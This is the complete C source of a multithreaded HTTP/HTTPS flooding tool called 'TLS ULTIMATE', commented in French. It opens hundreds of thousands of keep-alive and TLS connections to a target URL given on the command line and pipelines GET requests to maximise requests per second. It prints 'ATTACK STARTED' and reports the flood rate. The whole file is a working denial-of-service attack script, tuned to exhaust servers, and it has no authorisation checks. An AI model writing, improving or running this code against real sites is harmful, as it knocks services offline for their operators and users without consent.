/*
 * ╔═══════════════════════════════════════════════════════════════════╗
 * ║         TLS ULTIMATE - MAXIMUM RPS / MINIMUM RESOURCES            ║
 * ║     Optimisé pour plus de 1M RPS avec moins de CPU/RAM            ║
 * ╚═══════════════════════════════════════════════════════════════════╝
 * 
 * gcc tls.c -o tls -pthread -lssl -lcrypto -O3 -march=native -mtune=native -flto -Wall
 */

#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <pthread.h>
#include <time.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <netinet/tcp.h>
#include <arpa/inet.h>
#include <netdb.h>
#include <fcntl.h>
#include <sys/epoll.h>
#include <errno.h>
#include <sched.h>
#include <sys/resource.h>
#include <sys/mman.h>
#include <openssl/ssl.h>
#include <openssl/err.h>

// ============================================================================
// CONFIGURATION OPTIMALE (MAX RPS / MIN RESSOURCES)
// ============================================================================

#define MAX_THREADS 2000
#define CONNS_PER_THREAD 300            // Réduit de 500 -> 300
#define MAX_EVENTS 500                  // Réduit de 1000 -> 500
#define SEND_PIPELINE 5                 // Pipeline modéré
#define USLEEP_MICRO 50                 // Micro-sleep pour équilibrer CPU
#define RECV_SKIP 4                     // Lire 1x sur 4 (économise CPU)
#define STATS_SYNC_INTERVAL 10000       // Sync moins fréquente

// Buffers optimisés
#define SOCKET_SEND_BUF (64 * 1024)     // 64KB au lieu de 256KB
#define SOCKET_RECV_BUF (32 * 1024)     // 32KB au lieu de 256KB
#define RECV_BUFFER 2048                // Buffer de lecture réduit

// ============================================================================
// STRUCTURES ULTRA-LÉGÈRES
// ============================================================================

typedef struct {
    int sock;
    SSL *ssl;
    SSL_SESSION *session;
    unsigned char state;
    unsigned char errors;
} __attribute__((packed)) Conn;

typedef struct {
    char *hostname;
    char *path;
    char *target_ip;
    int port;
    int is_https;
    time_t end_time;
    int thread_id;
    
    SSL_CTX *ssl_ctx;
    
    // Stats locales (évite atomic ops constantes)
    unsigned long local_req;
    unsigned long local_bytes;
    
    volatile unsigned long *total_req;
    volatile unsigned long *total_bytes;
    volatile int *stop;
} ThreadData;

// ============================================================================
// GLOBALS
// ============================================================================

static char g_ip[64] = {0};
static char g_req[512];
static int g_req_len = 0;
static pthread_mutex_t stats_mutex = PTHREAD_MUTEX_INITIALIZER;

// ============================================================================
// OPTIMISATIONS SYSTÈME
// ============================================================================

void optimize_system() {
    struct rlimit rl;
    rl.rlim_cur = 1000000;
    rl.rlim_max = 1000000;
    setrlimit(RLIMIT_NOFILE, &rl);
}

// ============================================================================
// DNS CACHE
// ============================================================================

int resolve(const char *host, char *ip) {
    if (g_ip[0]) {
        strcpy(ip, g_ip);
        return 0;
    }
    
    struct in_addr tmp;
    if (inet_pton(AF_INET, host, &tmp) == 1) {
        strcpy(ip, host);
        strcpy(g_ip, host);
        return 0;
    }
    
    struct hostent *he = gethostbyname(host);
    if (!he) return -1;
    
    struct in_addr **al = (struct in_addr **)he->h_addr_list;
    if (al[0]) {
        strcpy(ip, inet_ntoa(*al[0]));
        strcpy(g_ip, ip);
        return 0;
    }
    return -1;
}

// ============================================================================
// SSL OPTIMISÉ PERFORMANCE
// ============================================================================

SSL_CTX* init_ssl() {
    SSL_library_init();
    
    const SSL_METHOD *method = TLS_client_method();
    SSL_CTX *ctx = SSL_CTX_new(method);
    if (!ctx) return NULL;
    
    // TLS 1.2/1.3
    SSL_CTX_set_min_proto_version(ctx, TLS1_2_VERSION);
    
    SSL_CTX_set_options(ctx,
        SSL_OP_NO_SSLv2 | SSL_OP_NO_SSLv3 |
        SSL_OP_NO_COMPRESSION | SSL_OP_NO_TICKET);
    
    SSL_CTX_set_mode(ctx,
        SSL_MODE_ENABLE_PARTIAL_WRITE |
        SSL_MODE_ACCEPT_MOVING_WRITE_BUFFER |
        SSL_MODE_RELEASE_BUFFERS);
    
    // Session cache CRITIQUE
    SSL_CTX_set_session_cache_mode(ctx, SSL_SESS_CACHE_CLIENT);
    SSL_CTX_sess_set_cache_size(ctx, 50000);
    
    // Cipher rapide
    SSL_CTX_set_cipher_list(ctx, "AES128-GCM-SHA256:AES256-GCM-SHA384");
    
    return ctx;
}

// ============================================================================
// SOCKET OPTIMISÉ
// ============================================================================

static inline int create_socket(const char *ip, int port) {
    int s = socket(AF_INET, SOCK_STREAM | SOCK_NONBLOCK, IPPROTO_TCP);
    if (s < 0) return -1;
    
    int opt = 1;
    setsockopt(s, IPPROTO_TCP, TCP_NODELAY, &opt, sizeof(opt));
    setsockopt(s, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt));
#ifdef SO_REUSEPORT
    setsockopt(s, SOL_SOCKET, SO_REUSEPORT, &opt, sizeof(opt));
#endif
    
    // Buffers modérés (économie RAM)
    int sendbuf = SOCKET_SEND_BUF;
    int recvbuf = SOCKET_RECV_BUF;
    setsockopt(s, SOL_SOCKET, SO_SNDBUF, &sendbuf, sizeof(sendbuf));
    setsockopt(s, SOL_SOCKET, SO_RCVBUF, &recvbuf, sizeof(recvbuf));
    
    setsockopt(s, IPPROTO_TCP, TCP_QUICKACK, &opt, sizeof(opt));
    
    struct linger l = {0, 0};
    setsockopt(s, SOL_SOCKET, SO_LINGER, &l, sizeof(l));
    
    struct sockaddr_in addr = {
        .sin_family = AF_INET,
        .sin_port = htons(port)
    };
    inet_pton(AF_INET, ip, &addr.sin_addr);
    
    connect(s, (struct sockaddr*)&addr, sizeof(addr));
    
    return s;
}

// ============================================================================
// WORKER THREAD - MAXIMUM EFFICACITÉ
// ============================================================================

void* worker(void *arg) {
    ThreadData *d = (ThreadData*)arg;
    
    // Pin CPU
    cpu_set_t cpu;
    CPU_ZERO(&cpu);
    CPU_SET(d->thread_id % sysconf(_SC_NPROCESSORS_ONLN), &cpu);
    pthread_setaffinity_np(pthread_self(), sizeof(cpu_set_t), &cpu);
    
    // Epoll
    int epfd = epoll_create1(EPOLL_CLOEXEC);
    if (epfd < 0) return NULL;
    
    // Connexions (aligned pour cache CPU)
    Conn *conns = aligned_alloc(64, CONNS_PER_THREAD * sizeof(Conn));
    memset(conns, 0, CONNS_PER_THREAD * sizeof(Conn));
    
    // Pré-créer connexions progressivement
    for (int i = 0; i < CONNS_PER_THREAD; i++) {
        int s = create_socket(d->target_ip, d->port);
        if (s >= 0) {
            conns[i].sock = s;
            conns[i].state = 0;
            conns[i].errors = 0;
            
            if (d->is_https && d->ssl_ctx) {
                SSL *ssl = SSL_new(d->ssl_ctx);
                SSL_set_fd(ssl, s);
                SSL_set_connect_state(ssl);
                SSL_set_tlsext_host_name(ssl, d->hostname);
                
                // Session reuse
                if (i > 0 && conns[i-1].session) {
                    SSL_set_session(ssl, conns[i-1].session);
                }
                
                conns[i].ssl = ssl;
            }
            
            struct epoll_event ev = {
                .events = EPOLLOUT | EPOLLIN | EPOLLET,
                .data.u32 = i
            };
            epoll_ctl(epfd, EPOLL_CTL_ADD, s, &ev);
        }
        
        // Délai progressif
        if (i % 10 == 0) usleep(100);
    }
    
    struct epoll_event *evs = malloc(MAX_EVENTS * sizeof(struct epoll_event));
    char recv_buf[RECV_BUFFER];
    
    unsigned int cycle = 0;
    unsigned int recv_skip = 0;
    unsigned int sync_counter = 0;
    
    // BOUCLE PRINCIPALE - ULTRA OPTIMISÉE
    while (!(*d->stop) && time(NULL) < d->end_time) {
        cycle++;
        
        // Epoll avec timeout court
        int nfds = epoll_wait(epfd, evs, MAX_EVENTS, 1);
        
        for (int i = 0; i < nfds; i++) {
            Conn *c = &conns[evs[i].data.u32];
            
            if (c->sock < 0) continue;
            
            // SEND - PIPELINE
            if (evs[i].events & EPOLLOUT) {
                
                if (c->ssl) {
                    // SSL Handshake
                    if (c->state == 0) {
                        int ret = SSL_do_handshake(c->ssl);
                        if (ret == 1) {
                            c->state = 1;
                            if (!c->session) {
                                c->session = SSL_get1_session(c->ssl);
                            }
                            c->errors = 0;
                        } else {
                            int err = SSL_get_error(c->ssl, ret);
                            if (err != SSL_ERROR_WANT_READ && err != SSL_ERROR_WANT_WRITE) {
                                if (++c->errors > 3) goto reconnect;
                            }
                        }
                    }
                    
                    // Pipeline requests
                    if (c->state == 1) {
                        for (int p = 0; p < SEND_PIPELINE; p++) {
                            int sent = SSL_write(c->ssl, g_req, g_req_len);
                            if (sent > 0) {
                                d->local_req++;
                                d->local_bytes += sent;
                            } else {
                                break;
                            }
                        }
                    }
                } else {
                    // HTTP Pipeline
                    for (int p = 0; p < SEND_PIPELINE; p++) {
                        int sent = send(c->sock, g_req, g_req_len, MSG_DONTWAIT | MSG_NOSIGNAL);
                        if (sent > 0) {
                            d->local_req++;
                            d->local_bytes += sent;
                        } else if (errno == EAGAIN || errno == EWOULDBLOCK) {
                            break;
                        } else {
                            goto reconnect;
                        }
                    }
                }
            }
            
            // RECEIVE - LAZY (économise CPU)
            if ((evs[i].events & EPOLLIN) && (recv_skip++ % RECV_SKIP == 0)) {
                int rcv = c->ssl ?
                    SSL_read(c->ssl, recv_buf, sizeof(recv_buf)) :
                    recv(c->sock, recv_buf, sizeof(recv_buf), MSG_DONTWAIT);
                
                if (rcv > 0) {
                    d->local_bytes += rcv;
                    c->errors = 0;
                } else if (rcv == 0) {
                    goto reconnect;
                }
            }
            
            // ERROR
            if (evs[i].events & (EPOLLERR | EPOLLHUP)) {
reconnect:
                epoll_ctl(epfd, EPOLL_CTL_DEL, c->sock, NULL);
                if (c->ssl) {
                    SSL_free(c->ssl);
                    c->ssl = NULL;
                }
                if (c->session) {
                    SSL_SESSION_free(c->session);
                    c->session = NULL;
                }
                close(c->sock);
                c->sock = -1;
                
                // Reconnect avec délai
                usleep(1000);
                
                int s = create_socket(d->target_ip, d->port);
                if (s >= 0) {
                    c->sock = s;
                    c->state = 0;
                    c->errors = 0;
                    
                    if (d->is_https && d->ssl_ctx) {
                        c->ssl = SSL_new(d->ssl_ctx);
                        SSL_set_fd(c->ssl, s);
                        SSL_set_connect_state(c->ssl);
                    }
                    
                    struct epoll_event ev = {
                        .events = EPOLLOUT | EPOLLIN | EPOLLET,
                        .data.u32 = evs[i].data.u32
                    };
                    epoll_ctl(epfd, EPOLL_CTL_ADD, s, &ev);
                }
            }
        }
        
        // Refill (moins agressif)
        if (cycle % 1000 == 0) {
            for (int i = 0; i < 5; i++) {
                if (conns[i].sock < 0) {
                    int s = create_socket(d->target_ip, d->port);
                    if (s >= 0) {
                        conns[i].sock = s;
                        conns[i].state = 0;
                        conns[i].errors = 0;
                        
                        if (d->is_https && d->ssl_ctx) {
                            conns[i].ssl = SSL_new(d->ssl_ctx);
                            SSL_set_fd(conns[i].ssl, s);
                            SSL_set_connect_state(conns[i].ssl);
                        }
                        
                        struct epoll_event ev = {
                            .events = EPOLLOUT | EPOLLIN | EPOLLET,
                            .data.u32 = i
                        };
                        epoll_ctl(epfd, EPOLL_CTL_ADD, s, &ev);
                    }
                }
            }
        }
        
        // Sync stats (moins fréquent)
        if (++sync_counter >= STATS_SYNC_INTERVAL) {
            pthread_mutex_lock(&stats_mutex);
            __sync_fetch_and_add(d->total_req, d->local_req);
            __sync_fetch_and_add(d->total_bytes, d->local_bytes);
            pthread_mutex_unlock(&stats_mutex);
            
            d->local_req = 0;
            d->local_bytes = 0;
            sync_counter = 0;
        }
        
        // CPU breathing (CRITIQUE)
        usleep(USLEEP_MICRO);
    }
    
    // Final sync
    pthread_mutex_lock(&stats_mutex);
    __sync_fetch_and_add(d->total_req, d->local_req);
    __sync_fetch_and_add(d->total_bytes, d->local_bytes);
    pthread_mutex_unlock(&stats_mutex);
    
    // Cleanup
    for (int i = 0; i < CONNS_PER_THREAD; i++) {
        if (conns[i].ssl) SSL_free(conns[i].ssl);
        if (conns[i].session) SSL_SESSION_free(conns[i].session);
        if (conns[i].sock >= 0) close(conns[i].sock);
    }
    close(epfd);
    free(conns);
    free(evs);
    
    return NULL;
}

// ============================================================================
// MAIN
// ============================================================================

int main(int argc, char *argv[]) {
    if (argc < 5) {
        printf("\n╔═══════════════════════════════════════════════════════════════════╗\n");
        printf("║      TLS ULTIMATE - MAX RPS / MIN RESSOURCES                      ║\n");
        printf("╚═══════════════════════════════════════════════════════════════════╝\n\n");
        printf("Usage: %s <url> <port> <time> <threads>\n\n", argv[0]);
        printf("Examples:\n");
        printf("  %s https://target.com 443 60 500\n", argv[0]);
        printf("  %s http://target.com 80 60 800\n\n", argv[0]);
        return 1;
    }
    
    const char *url = argv[1];
    int port = atoi(argv[2]);
    int duration = atoi(argv[3]);
    int threads = atoi(argv[4]);
    
    if (threads > MAX_THREADS) threads = MAX_THREADS;
    if (threads < 1) threads = 100;
    
    optimize_system();
    
    // Parse URL
    char *hostname = NULL;
    char *path = NULL;
    int is_https = 0;
    
    const char *start = url;
    if (strncmp(url, "https://", 8) == 0) {
        start = url + 8;
        is_https = 1;
    } else if (strncmp(url, "http://", 7) == 0) {
        start = url + 7;
    }
    
    const char *slash = strchr(start, '/');
    if (slash) {
        size_t len = slash - start;
        hostname = malloc(len + 1);
        memcpy(hostname, start, len);
        hostname[len] = '\0';
        path = strdup(slash);
    } else {
        hostname = strdup(start);
        path = strdup("/");
    }
    
    // Resolve
    char ip[64];
    if (resolve(hostname, ip) != 0) {
        printf("[✗] DNS failed: %s\n", hostname);
        return 1;
    }
    
    // Build request template
    g_req_len = snprintf(g_req, sizeof(g_req),
        "GET %s HTTP/1.1\r\nHost: %s\r\n"
        "User-Agent: Mozilla/5.0\r\n"
        "Accept: */*\r\nConnection: keep-alive\r\n\r\n",
        path, hostname);
    
    // SSL init
    SSL_CTX *ssl_ctx = NULL;
    if (is_https) {
        ssl_ctx = init_ssl();
        if (!ssl_ctx) {
            printf("[✗] SSL init failed\n");
            return 1;
        }
    }
    
    printf("\n⚡ TLS ULTIMATE - MAX EFFICIENCY ⚡\n\n");
    printf("Target:      %s (%s)\n", hostname, ip);
    printf("Port:        %d\n", port);
    printf("Protocol:    %s\n", is_https ? "HTTPS" : "HTTP");
    printf("Duration:    %d seconds\n", duration);
    printf("Threads:     %d\n", threads);
    printf("Connections: %d (%d per thread)\n", threads * CONNS_PER_THREAD, CONNS_PER_THREAD);
    printf("Pipeline:    %d requests\n", SEND_PIPELINE);
    printf("Optimized:   Low CPU, Low RAM, High RPS\n");
    printf("\n");
    
    srand(time(NULL));
    
    volatile int stop = 0;
    volatile unsigned long total_req = 0;
    volatile unsigned long total_bytes = 0;
    
    pthread_t *handles = malloc(threads * sizeof(pthread_t));
    
    printf("[*] Launching %d threads...\n", threads);
    
    time_t start_time = time(NULL);
    time_t end_time = start_time + duration;
    
    // Créer threads progressivement
    for (int i = 0; i < threads; i++) {
        ThreadData *d = malloc(sizeof(ThreadData));
        d->hostname = hostname;
        d->target_ip = ip;
        d->port = port;
        d->path = path;
        d->is_https = is_https;
        d->end_time = end_time;
        d->thread_id = i;
        d->ssl_ctx = ssl_ctx;
        d->local_req = 0;
        d->local_bytes = 0;
        d->total_req = &total_req;
        d->total_bytes = &total_bytes;
        d->stop = &stop;
        
        pthread_create(&handles[i], NULL, worker, d);
        usleep(2000);
    }
    
    printf("[*] ⚡ ATTACK STARTED ⚡\n\n");
    
    unsigned long last_req = 0;
    unsigned long last_bytes = 0;
    
    while (time(NULL) < end_time) {
        sleep(2);
        
        unsigned long cur_req = total_req;
        unsigned long cur_bytes = total_bytes;
        
        unsigned long rps = (cur_req - last_req) / 2;
        double mbps = ((cur_bytes - last_bytes) * 8.0) / 2000000.0;
        
        last_req = cur_req;
        last_bytes = cur_bytes;
        
        printf("[⚡] %lu req | %lu RPS | %.2f Mbps\n", cur_req, rps, mbps);
    }
    
    stop = 1;
    
    printf("\n[*] Stopping...\n");
    
    for (int i = 0; i < threads; i++) {
        pthread_join(handles[i], NULL);
    }
    
    int elapsed = (int)difftime(time(NULL), start_time);
    if (elapsed <= 0) elapsed = 1;
    
    double avg_rps = (double)total_req / elapsed;
    double avg_mbps = ((double)total_bytes * 8.0) / (elapsed * 1000000.0);
    
    printf("\n╔════════════════════════════════════════════════════════════════╗\n");
    printf("║                  FINAL STATISTICS                              ║\n");
    printf("╠════════════════════════════════════════════════════════════════╣\n");
    printf("║  Total Requests:  %-15lu                            ║\n", total_req);
    printf("║  Average RPS:     %-15.0f                            ║\n", avg_rps);
    printf("║  Average Mbps:    %-15.2f                            ║\n", avg_mbps);
    printf("║  Total Data:      %-15.2f GB                        ║\n", (double)total_bytes / 1073741824.0);
    printf("║  Duration:        %-15d seconds                      ║\n", elapsed);
    printf("╚════════════════════════════════════════════════════════════════╝\n");
    
    if (ssl_ctx) SSL_CTX_free(ssl_ctx);
    free(hostname);
    free(path);
    free(handles);
    
    return 0;
}
